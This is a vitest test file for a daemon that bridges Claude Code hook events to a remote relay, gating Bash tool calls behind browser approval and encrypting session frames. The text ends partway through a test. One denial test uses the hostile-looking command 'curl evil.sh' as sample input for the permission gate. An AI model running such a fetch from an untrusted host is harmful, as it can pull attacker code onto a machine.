import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import {
  adoptStatePayloadSchema,
  agentNoticePayloadSchema,
  deriveSharedKey,
  encodeKey,
  generateKeyPair,
  importIdentityPrivateKey,
  importIdentityPublicKey,
  makeEnvelope,
  openPayload,
  sealPayload,
  sessionAdoptedPayloadSchema,
  sessionHistoryPayloadSchema,
  sessionMetaPayloadSchema,
  type Envelope,
} from '@telecode/protocol';
import { pino } from 'pino';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { createFakeAgentAdapter } from './agent-adapter';
import { createDaemon, type Daemon } from './daemon';
import { hookRpc } from './hook-rpc';
import { createSessionStore } from './sessions/session-store';
import { markViewerPresent, startFakeRelay, type FakeRelay } from './fake-relay';

/**
 * Adopted sessions, end-to-end through the daemon (Journey 1, Task 8): the `telecode hook` bridge reaches
 * the daemon's Unix socket; the daemon announces the external session to the relay (`session.adopted`),
 * pairs the relay's minted id, and routes the tool call through telecode's existing gate — a read-only tool
 * auto-allows; a consequential one blocks on the browser's decision. Real daemon + real socket + a fake
 * relay (FakeRelay stands in for relay + browser).
 */
const USER = 'user-adopt';
const DEVICE = 'device-adopt';
const CLAUDE_SESSION = 'claude-sess-1';
const TELECODE_SESSION = '11111111-1111-1111-1111-111111111111';

/** One bridge round-trip over the hook socket: write the event, half-close, read the decision JSON. */

/** Assert a deny-feedback reason carries every expected fragment (keeps the loop out of the test body). */
function assertReasonContainsAll(reason: string | undefined, expected: readonly string[]): void {
  expect(expected.length).toBeGreaterThan(0); // a misconfigured variant must fail loudly, not vacuously
  for (const fragment of expected) expect(reason).toContain(fragment);
}

/** Assert each installed hook event carries exactly one telecode hook (proves re-install never duplicates). */
function assertNoDuplicateTelecodeHooks(settings: {
  hooks: Record<string, { hooks: { command: string }[] }[]>;
}): void {
  for (const [event, groups] of Object.entries(settings.hooks)) {
    const telecodeCommands = groups
      .flatMap((g) => g.hooks.map((h) => h.command))
      .filter((c) => /telecode\b.*\bhook\b/.test(c));
    expect(telecodeCommands, `event ${event} should have exactly one telecode hook`).toHaveLength(
      1,
    );
  }
}

/** Reply to the daemon's `session.adopted` announce with the relay-minted id (pairs the Claude session). */
function ackAdopted(relay: FakeRelay, announce: Envelope): void {
  const clientRef = (announce.payload as { clientRef: string }).clientRef;
  relay.send(
    makeEnvelope({
      type: 'session.adopted',
      userId: USER,
      deviceId: DEVICE,
      sessionId: TELECODE_SESSION,
      payload: { clientRef },
    }),
  );
}

describe('daemon: adopted sessions end-to-end', () => {
  let relay: FakeRelay;
  let daemon: Daemon;
  let dir: string;
  let socketPath: string;

  beforeEach(async () => {
    relay = await startFakeRelay(USER, DEVICE);
    dir = await mkdtemp(join(tmpdir(), 'telecode-daemon-adopt-'));
    socketPath = join(dir, 'run', 'hook.sock');
    daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
    });
    await daemon.start();
    // These tests act as a watching browser (they send permission/question decisions), so tell the daemon a
    // viewer is present — otherwise the gate would defer to the local prompt. The dedicated "no browser
    // watching" describe below covers the unwatched case.
    await markViewerPresent(relay, USER, DEVICE);
  });

  afterEach(async () => {
    await daemon.stop();
    await relay.close();
    await rm(dir, { recursive: true, force: true });
  });

  it('announces the session and auto-allows a read-only tool', async () => {
    const event = {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      cwd: '/repo',
      tool_name: 'Read',
      tool_input: { file_path: 'README.md' },
      tool_use_id: 'toolu_1',
    };
    const decision = hookRpc(socketPath, event);

    // The daemon announces the external session; ack it so adoption resolves.
    const announce = await relay.waitForFrame((e) => e.type === 'session.adopted');
    expect((announce.payload as { clientRef: string; cwd?: string }).clientRef).toBe(
      CLAUDE_SESSION,
    );
    ackAdopted(relay, announce);

    expect(await decision).toMatchObject({
      hookSpecificOutput: { permissionDecision: 'allow' },
    });
  });

  it('routes a consequential tool through the gate and honors the browser decision', async () => {
    // First event adopts the session (read-only) and we ack it.
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      cwd: '/repo',
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    // Second event is a consequential tool — it must block on a human decision (no re-announce).
    const bash = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Bash',
      tool_input: { command: 'rm -rf build' },
      tool_use_id: 'toolu_2',
    });

    const request = await relay.waitForFrame((e) => e.type === 'agent.permission_request');
    expect(request.session_id).toBe(TELECODE_SESSION);
    const requestId = (request.payload as { requestId: string; toolName: string }).requestId;
    expect((request.payload as { toolName: string }).toolName).toBe('Bash');

    // The browser approves → the hook resolves to allow.
    relay.send(
      makeEnvelope({
        type: 'permission.decision',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: { requestId, behavior: 'allow' },
      }),
    );

    expect(await bash).toMatchObject({ hookSpecificOutput: { permissionDecision: 'allow' } });
  });

  it('denies the tool when the browser denies', async () => {
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    const bash = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Bash',
      tool_input: { command: 'curl evil.sh' },
    });
    const request = await relay.waitForFrame((e) => e.type === 'agent.permission_request');
    const requestId = (request.payload as { requestId: string }).requestId;
    relay.send(
      makeEnvelope({
        type: 'permission.decision',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: { requestId, behavior: 'deny', message: 'nope' },
      }),
    );

    expect(await bash).toMatchObject({ hookSpecificOutput: { permissionDecision: 'deny' } });
  });

  it('mirrors bypassPermissions — a consequential tool defers to the local session, never gated', async () => {
    // Adopt the session (read-only) and ack it. The session reports it is running in Bypass mode.
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      cwd: '/repo',
      tool_name: 'Read',
      tool_input: {},
      permission_mode: 'bypassPermissions',
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    // A consequential tool in a locally-Bypass session must NOT block on a remote approval — the daemon
    // defers so Claude Code's own bypass runs it. Were it still gated, this round-trip would hang forever
    // (no `permission.decision` is ever sent), timing the test out; resolving at all is the proof.
    const bash = await hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Bash',
      tool_input: { command: 'rm -rf build' },
      tool_use_id: 'toolu_bypass',
      permission_mode: 'bypassPermissions',
    });
    // Defer = an empty object (no `hookSpecificOutput`): telecode voices no opinion, Claude Code's mode
    // decides. Contrast the `default`-mode test above, which DOES forward an `agent.permission_request`.
    expect(bash).toEqual({});
  });

  it('forwards an AskUserQuestion as agent.question and relays the pick as deny-feedback', async () => {
    // Adopt the session first (a read-only tool), then ack it.
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    // Claude raises a multiple-choice question (the captured AskUserQuestion tool_input shape).
    const ask = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'AskUserQuestion',
      tool_use_id: 'toolu_q1',
      tool_input: {
        questions: [
          {
            question: 'Which database should we use?',
            header: 'Database',
            multiSelect: false,
            options: [
              { label: 'Postgres', description: 'Relational.' },
              { label: 'SQLite', description: 'Embedded.' },
            ],
          },
        ],
      },
    });

    // The daemon forwards it to the browser as a structured agent.question (NOT a permission_request).
    const question = await relay.waitForFrame((e) => e.type === 'agent.question');
    expect(question.session_id).toBe(TELECODE_SESSION);
    const qPayload = question.payload as {
      requestId: string;
      questions: { header: string; options: { label: string }[] }[];
    };
    expect(qPayload.questions[0]?.header).toBe('Database');
    expect(qPayload.questions[0]?.options.map((o) => o.label)).toEqual(['Postgres', 'SQLite']);

    // The user picks Postgres on the phone.
    relay.send(
      makeEnvelope({
        type: 'question.answer',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: { requestId: qPayload.requestId, answers: [{ selectedLabels: ['Postgres'] }] },
      }),
    );

    // The hook denies the tool but carries the user's pick as a relayed answer (deny-feedback, AD-4).
    const out = (await ask) as {
      hookSpecificOutput: { permissionDecision: string; permissionDecisionReason?: string };
    };
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    expect(out.hookSpecificOutput.permissionDecisionReason).toContain('Postgres');
    expect(out.hookSpecificOutput.permissionDecisionReason).toContain('relayed');
  });

  it('fails closed (ask) when the AskUserQuestion input cannot be parsed', async () => {
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    // A malformed AskUserQuestion (no parsable questions) must never auto-answer — defer to the local picker.
    const ask = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'AskUserQuestion',
      tool_input: { not_questions: true },
    });
    expect(await ask).toMatchObject({ hookSpecificOutput: { permissionDecision: 'ask' } });
  });

  // Variant coverage (final journey task): the full hook → socket → daemon → relay → answer path over the
  // answer shapes Claude Code can produce — single-select, multi-select, "Other" free text, and several
  // questions in one call — each asserting the deny-feedback reason carries every relayed pick.
  const variants = [
    {
      name: 'single-select',
      questions: [
        {
          question: 'DB?',
          header: 'Database',
          multiSelect: false,
          options: [{ label: 'Postgres' }],
        },
      ],
      answers: [{ selectedLabels: ['Postgres'] }],
      expected: ['Postgres'],
    },
    {
      name: 'multi-select',
      questions: [
        {
          question: 'Features?',
          header: 'Features',
          multiSelect: true,
          options: [{ label: 'Auth' }, { label: 'Billing' }],
        },
      ],
      answers: [{ selectedLabels: ['Auth', 'Billing'] }],
      expected: ['Auth', 'Billing'],
    },
    {
      name: 'Other free-text only',
      questions: [
        {
          question: 'DB?',
          header: 'Database',
          multiSelect: false,
          options: [{ label: 'Postgres' }],
        },
      ],
      answers: [{ selectedLabels: [], otherText: 'DuckDB' }],
      expected: ['DuckDB'],
    },
    {
      name: 'multiple questions in one call',
      questions: [
        {
          question: 'DB?',
          header: 'Database',
          multiSelect: false,
          options: [{ label: 'Postgres' }],
        },
        { question: 'Region?', header: 'Region', multiSelect: false, options: [{ label: 'EU' }] },
      ],
      answers: [{ selectedLabels: ['Postgres'] }, { selectedLabels: ['EU'] }],
      expected: ['Postgres', 'EU'],
    },
  ];

  it.each(variants)('relays a $name answer back as deny-feedback', async (variant) => {
    const ask = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'AskUserQuestion',
      tool_input: { questions: variant.questions },
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    const question = await relay.waitForFrame((e) => e.type === 'agent.question');
    const requestId = (question.payload as { requestId: string }).requestId;

    relay.send(
      makeEnvelope({
        type: 'question.answer',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: { requestId, answers: variant.answers },
      }),
    );

    const out = (await ask) as {
      hookSpecificOutput: { permissionDecision: string; permissionDecisionReason?: string };
    };
    expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
    assertReasonContainsAll(out.hookSpecificOutput.permissionDecisionReason, variant.expected);
  });

  it('releases a pending question when the session is interrupted (fails closed, no deadlock)', async () => {
    const ask = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'AskUserQuestion',
      tool_input: {
        questions: [{ question: 'q?', header: 'H', multiSelect: false, options: [{ label: 'a' }] }],
      },
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await relay.waitForFrame((e) => e.type === 'agent.question');

    // The operator interrupts the session while the question is still pending. An adopted session has no
    // AbortController, so stopTurn must explicitly release the pending question (J1 deadlock guard).
    relay.send(
      makeEnvelope({
        type: 'session.control',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: { action: 'interrupt' },
      }),
    );

    // Fail-closed: the hook returns `ask` (defer to the local picker) rather than hanging forever.
    expect(await ask).toMatchObject({ hookSpecificOutput: { permissionDecision: 'ask' } });
  });

  it('adopts a session on SessionStart with an IDS-ONLY announce + a sealed cwd-derived title (T5)', async () => {
    // A chat-only session (never calls a tool) is invisible today. SessionStart adopts it eagerly.
    const start = hookRpc(socketPath, {
      hook_event_name: 'SessionStart',
      session_id: CLAUDE_SESSION,
      cwd: '/Users/me/myrepo',
      source: 'startup',
    });
    const announce = await relay.waitForFrame((e) => e.type === 'session.adopted');
    const payload = sessionAdoptedPayloadSchema.parse(announce.payload);
    // The announce is ids-only now (ux Phase 6 T5) — the project name/path never reach the relay in the
    // clear; they travel in the sealed session.meta (cleartext here since this daemon has no keypair).
    expect(payload.clientRef).toBe(CLAUDE_SESSION);
    expect(payload.title).toBeUndefined();
    expect(payload.cwd).toBeUndefined();
    ackAdopted(relay, announce);
    expect(await start).toEqual({});

    const meta = sessionMetaPayloadSchema.parse(
      (
        await relay.waitForFrame(
          (e) => e.type === 'session.meta' && e.session_id === TELECODE_SESSION,
        )
      ).payload,
    );
    expect(meta.title).toBe('myrepo'); // derived from the cwd basename so the row has a sensible name
    expect(meta.titleSource).toBe('derived');
    expect(meta.cwd).toBe('/Users/me/myrepo');
  });

  it('refines the adopted title from the first REAL prompt, skipping harness-injected machinery', async () => {
    // Adopt eagerly (cwd-derived title), then a Stop mirrors a transcript whose first 'user' entry is
    // slash-command caveat machinery. The refined title must come from the human's prompt — 10-word
    // capped — never from the injected tag soup.
    const start = hookRpc(socketPath, {
      hook_event_name: 'SessionStart',
      session_id: CLAUDE_SESSION,
      cwd: '/Users/me/myrepo',
      source: 'startup',
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await start;
    await relay.waitForFrame((e) => e.type === 'session.meta' && e.session_id === TELECODE_SESSION);

    const transcriptPath = join(dir, 'refine-transcript.jsonl');
    const userLine = (text: string) =>
      JSON.stringify({ type: 'user', message: { role: 'user', content: text } });
    await writeFile(
      transcriptPath,
      `${userLine(
        '<local-command-caveat>Caveat: the messages below were generated by the user while running a local command</local-command-caveat>',
      )}\n${userLine(
        'read the memory and continue the session identity journey from task seven please today',
      )}\n`,
    );
    await hookRpc(socketPath, {
      hook_event_name: 'Stop',
      session_id: CLAUDE_SESSION,
      transcript_path: transcriptPath,
    });

    const refined = sessionMetaPayloadSchema.parse(
      (
        await relay.waitForFrame(
          (e) =>
            e.type === 'session.meta' &&
            e.session_id === TELECODE_SESSION &&
            ((e.payload as { title?: string }).title?.startsWith('read the memory') ?? false),
        )
      ).payload,
    );
    expect(refined.title).toBe('read the memory and continue the session identity journey from…');
    expect(refined.titleSource).toBe('derived');
  });

  it('ends an adopted session on SessionEnd (Journey 3 lifecycle)', async () => {
    // Adopt the session via a read-only tool, ack it.
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    // The Claude Code process exits → the SessionEnd hook fires. The daemon must end the adopted session
    // (today it lingers as running forever). Non-PreToolUse events return an empty hook output.
    const ended = hookRpc(socketPath, {
      hook_event_name: 'SessionEnd',
      session_id: CLAUDE_SESSION,
      reason: 'other',
    });

    const endFrame = await relay.waitForFrame((e) => e.type === 'session.ended');
    expect(endFrame.session_id).toBe(TELECODE_SESSION);
    expect(endFrame.status).toBe('done'); // cleartext routing status on the envelope
    expect(await ended).toEqual({});
  });

  it('emits agent.notice on a Notification for an adopted session (idle/needs attention)', async () => {
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    // The session goes idle → Claude Code fires a Notification. The daemon surfaces it as a non-blocking
    // attention signal (no answer required). Notification events return an empty hook output.
    const notif = hookRpc(socketPath, {
      hook_event_name: 'Notification',
      session_id: CLAUDE_SESSION,
      message: 'Claude is waiting for your input',
    });
    const notice = await relay.waitForFrame((e) => e.type === 'agent.notice');
    expect(notice.session_id).toBe(TELECODE_SESSION);
    expect(agentNoticePayloadSchema.parse(notice.payload).message).toBe(
      'Claude is waiting for your input',
    );
    expect(await notif).toEqual({});
  });

  it('skips the notice while a gate is already showing, but emits once the session resumes', async () => {
    const first = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Read',
      tool_input: {},
    });
    ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
    await first;

    // A consequential tool parks the session at awaiting_input.
    const bash = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Bash',
      tool_input: { command: 'ls' },
    });
    const request = await relay.waitForFrame((e) => e.type === 'agent.permission_request');
    const requestId = (request.payload as { requestId: string }).requestId;

    // A Notification arriving WHILE the gate shows is redundant → skipped (not emitted as a notice).
    await hookRpc(socketPath, {
      hook_event_name: 'Notification',
      session_id: CLAUDE_SESSION,
      message: 'redundant-permission-prompt',
    });

    // Resolve the gate; the session resumes (running).
    relay.send(
      makeEnvelope({
        type: 'permission.decision',
        userId: USER,
        deviceId: DEVICE,
        sessionId: TELECODE_SESSION,
        payload: { requestId, behavior: 'allow' },
      }),
    );
    await bash;

    // A Notification after the gate clears DOES emit — and it is the FIRST agent.notice (proving the one
    // sent during the gate was skipped, not merely delayed).
    await hookRpc(socketPath, {
      hook_event_name: 'Notification',
      session_id: CLAUDE_SESSION,
      message: 'now-idle',
    });
    const notice = await relay.waitForFrame((e) => e.type === 'agent.notice');
    expect(agentNoticePayloadSchema.parse(notice.payload).message).toBe('now-idle');
  });

  it('ignores SessionEnd for a session it never adopted (no phantom row/end)', async () => {
    // No prior adoption for this Claude session → SessionEnd must be a no-op (return {}, never force-adopt).
    const ended = hookRpc(socketPath, {
      hook_event_name: 'SessionEnd',
      session_id: 'claude-never-adopted',
      reason: 'other',
    });
    expect(await ended).toEqual({});

    // Prove no phantom announce: a subsequent REAL adoption is the FIRST session.adopted frame (had the
    // unknown SessionEnd wrongly announced, waitForFrame would surface that stale clientRef first).
    const adopt = hookRpc(socketPath, {
      hook_event_name: 'PreToolUse',
      session_id: CLAUDE_SESSION,
      tool_name: 'Read',
      tool_input: {},
    });
    const announce = await relay.waitForFrame((e) => e.type === 'session.adopted');
    expect((announce.payload as { clientRef: string }).clientRef).toBe(CLAUDE_SESSION);
    ackAdopted(relay, announce);
    await adopt;
  });
});

describe('daemon: adopted gate defers to the local prompt when no browser is watching', () => {
  it('defers a consequential tool ({}) instead of blocking on a remote approval nobody can give', async () => {
    const relay = await startFakeRelay(USER, DEVICE);
    const dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-unwatched-'));
    const socketPath = join(dir, 'run', 'hook.sock');
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
    });
    await daemon.start();
    // Deliberately NO markViewerPresent — remoteViewerOnline stays at its cold default (false).
    try {
      // Adopt the session with a read-only event, ack it.
      const first = hookRpc(socketPath, {
        hook_event_name: 'PreToolUse',
        session_id: CLAUDE_SESSION,
        tool_name: 'Read',
        tool_input: {},
      });
      ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
      await first;

      // A consequential tool in `default` mode WOULD normally gate — but with nobody watching remotely,
      // telecode must defer to Claude Code's own local prompt ({}) rather than block forever on a remote
      // decision no operator is there to give. A block would hang this round-trip until the test times out.
      const bash = await hookRpc(socketPath, {
        hook_event_name: 'PreToolUse',
        session_id: CLAUDE_SESSION,
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf build' },
        tool_use_id: 'toolu_unwatched',
      });
      expect(bash).toEqual({});
    } finally {
      await daemon.stop();
      await relay.close();
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('daemon: viewer presence resets on reconnect (no stale gating)', () => {
  it('resets to "not watching" on reconnect, so an adopted tool defers until the relay re-asserts', async () => {
    const relay = await startFakeRelay(USER, DEVICE);
    const dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-reconnect-'));
    const socketPath = join(dir, 'run', 'hook.sock');
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
    });
    await daemon.start();
    try {
      // A browser is watching → gating is active. Adopt the session and ack it.
      await markViewerPresent(relay, USER, DEVICE);
      const first = hookRpc(socketPath, {
        hook_event_name: 'PreToolUse',
        session_id: CLAUDE_SESSION,
        tool_name: 'Read',
        tool_input: {},
      });
      ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
      await first;

      // The relay link drops and the daemon reconnects. A real relay re-asserts viewer.presence right after
      // hello.ack; this stand-in does NOT — so if the reset were missing, the daemon would still believe a
      // viewer is watching and gate the tool below (hanging forever). With the reset it defers to local ({}).
      relay.dropConnection();
      await relay.waitForHello();

      const bash = await hookRpc(socketPath, {
        hook_event_name: 'PreToolUse',
        session_id: CLAUDE_SESSION,
        tool_name: 'Bash',
        tool_input: { command: 'rm -rf build' },
        tool_use_id: 'toolu_reconnect',
      });
      expect(bash).toEqual({});
    } finally {
      await daemon.stop();
      await relay.close();
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('daemon: session reconciliation on (re)connect', () => {
  it('reports the held session ids on connect + reconnect so the relay can retire stale ones', async () => {
    const relay = await startFakeRelay(USER, DEVICE);
    const dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-reconcile-'));
    const socketPath = join(dir, 'run', 'hook.sock');
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
    });
    await daemon.start();
    try {
      // A fresh daemon holds nothing yet — but it STILL sends a reconcile (empty list), so the relay can
      // retire every stale row for the device on a cold start.
      const first = await relay.waitForFrame((e) => e.type === 'session.reconcile');
      expect((first.payload as { heldSessionIds: string[] }).heldSessionIds).toEqual([]);

      // Adopt a session (now held in memory), then force a reconnect → the next reconcile includes it.
      const evt = hookRpc(socketPath, {
        hook_event_name: 'PreToolUse',
        session_id: CLAUDE_SESSION,
        tool_name: 'Read',
        tool_input: {},
      });
      ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
      await evt;

      // waitForHello is a sufficient barrier: the daemon sends the reconcile right after receiving hello.ack,
      // over the same socket, and FakeRelay buffers it until consumed — so no timing wait is needed. (The
      // first, empty reconcile was already consumed above, so this awaits the post-reconnect one.)
      relay.dropConnection();
      await relay.waitForHello();
      const afterReconnect = await relay.waitForFrame((e) => e.type === 'session.reconcile');
      expect((afterReconnect.payload as { heldSessionIds: string[] }).heldSessionIds).toContain(
        TELECODE_SESSION,
      );
    } finally {
      await daemon.stop();
      await relay.close();
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('daemon: an unanswered adopted question fails closed (no hook-socket deadlock)', () => {
  it('settles a pending question when the daemon stops, instead of hanging', async () => {
    const relay = await startFakeRelay(USER, DEVICE);
    const dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-q-'));
    const socketPath = join(dir, 'run', 'hook.sock');
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
    });
    await daemon.start();
    await markViewerPresent(relay, USER, DEVICE); // a browser is watching, so the question forwards (not defers to local)
    try {
      const ask = hookRpc(socketPath, {
        hook_event_name: 'PreToolUse',
        session_id: CLAUDE_SESSION,
        tool_name: 'AskUserQuestion',
        tool_input: {
          questions: [
            { question: 'q?', header: 'H', multiSelect: false, options: [{ label: 'a' }] },
          ],
        },
      });
      // Don't let an unsettled rejection escape — we only assert that stop() releases it.
      const settled = ask.then(
        () => 'resolved',
        () => 'rejected',
      );
      ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
      await relay.waitForFrame((e) => e.type === 'agent.question');

      // No answer arrives. stop() must release the blocked question (J1's deadlock regression guard).
      await daemon.stop();
      expect(['resolved', 'rejected']).toContain(await settled);
    } finally {
      await relay.close();
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('daemon: adopted sessions are E2E-encrypted (invariant #5)', () => {
  it('seals the adopted session.meta — title/cwd never reach the relay in cleartext (T5)', async () => {
    const relay = await startFakeRelay(USER, DEVICE);
    const dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-meta-e2e-'));
    const socketPath = join(dir, 'run', 'hook.sock');
    const keyPair = await generateKeyPair();
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
      keyPair: {
        publicKey: encodeKey(keyPair.publicKey),
        privateKey: encodeKey(keyPair.privateKey),
      },
    });
    await daemon.start();
    try {
      const decision = hookRpc(socketPath, {
        hook_event_name: 'SessionStart',
        session_id: CLAUDE_SESSION,
        cwd: '/Users/me/secret-project',
        source: 'startup',
      });
      ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
      const meta = await relay.waitForFrame(
        (e) => e.type === 'session.meta' && e.session_id === TELECODE_SESSION,
      );
      // Invariant #5 / the P1-2 privacy fix: the project name/path are OPAQUE ciphertext to the relay —
      // a non-empty nonce, a string payload, and the plaintext cwd nowhere in the frame.
      expect(meta.nonce).not.toBe('');
      expect(typeof meta.payload).toBe('string');
      expect(JSON.stringify(meta)).not.toContain('secret-project');
      await decision;
    } finally {
      await daemon.stop();
      await relay.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('sends adopted-session frames to the relay as ciphertext, not plaintext', async () => {
    const relay = await startFakeRelay(USER, DEVICE);
    const dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-e2e-'));
    const socketPath = join(dir, 'run', 'hook.sock');
    const keyPair = await generateKeyPair();
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
      // A keypair (as every paired daemon has) makes adopted sessions run end-to-end encrypted.
      keyPair: {
        publicKey: encodeKey(keyPair.publicKey),
        privateKey: encodeKey(keyPair.privateKey),
      },
    });
    await daemon.start();
    await markViewerPresent(relay, USER, DEVICE); // a browser is watching, so the consequential tool is gated remotely
    try {
      // The hook will block on the gate (Bash is consequential); we only assert what the relay sees.
      const blocked = hookRpc(socketPath, {
        hook_event_name: 'PreToolUse',
        session_id: CLAUDE_SESSION,
        tool_name: 'Bash',
        tool_input: { command: 'ls' },
      });
      blocked.catch(() => undefined); // resolves/rejects on stop() — we don't await it

      ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
      const request = await relay.waitForFrame((e) => e.type === 'agent.permission_request');

      // Invariant #5: the relay forwards ciphertext only — the gate payload is an opaque encrypted string
      // with a non-empty nonce, NOT the cleartext { requestId, toolName, input } object.
      expect(request.nonce).not.toBe('');
      expect(typeof request.payload).toBe('string');
    } finally {
      await daemon.stop();
      await relay.close();
      await rm(dir, { recursive: true, force: true });
    }
  });

  it('sends an adopted-session agent.question as ciphertext (questions never hit the relay in cleartext)', async () => {
    const relay = await startFakeRelay(USER, DEVICE);
    const dir = await mkdtemp(join(tmpdir(), 'telecode-adopt-q-e2e-'));
    const socketPath = join(dir, 'run', 'hook.sock');
    const keyPair = await generateKeyPair();
    const daemon = createDaemon({
      relayUrl: relay.url,
      userId: USER,
      deviceId: DEVICE,
      agentAdapter: createFakeAgentAdapter([]),
      adopt: { socketPath, ackTimeoutMs: 2000 },
      keyPair: {
        publicKey: encodeKey(keyPair.publicKey),
        privateKey: encodeKey(keyPair.privateKey),
      },
    });
    await daemon.start();
    await markViewerPresent(relay, USER, DEVICE); // a browser is watching, so the question forwards (as ciphertext)
    try {
      const blocked = hookRpc(socketPath, {
        hook_event_name: 'PreToolUse',
        session_id: CLAUDE_SESSION,
        tool_name: 'AskUserQuestion',
        tool_input: {
          questions: [
            {
              question: 'DB?',
              header: 'Database',
              multiSelect: false,
              options: [{ label: 'Postgres' }],
            },
          ],
        },
      });
      blocked.catch(() => undefined); // resolves/rejects on stop() — we don't await it

      ackAdopted(relay, await relay.waitForFrame((e) => e.type === 'session.adopted'));
      const question = await relay.waitForFrame((e) => e.type === 'agent.question');

      // Invariant #5: the question (which can contain sensitive prompt text) is opaque ciphertext to the
      // relay — an encrypted string with a non-empty nonce, never the cleartext { requestId, questions }.
      expect(question.nonce).not.toBe('');
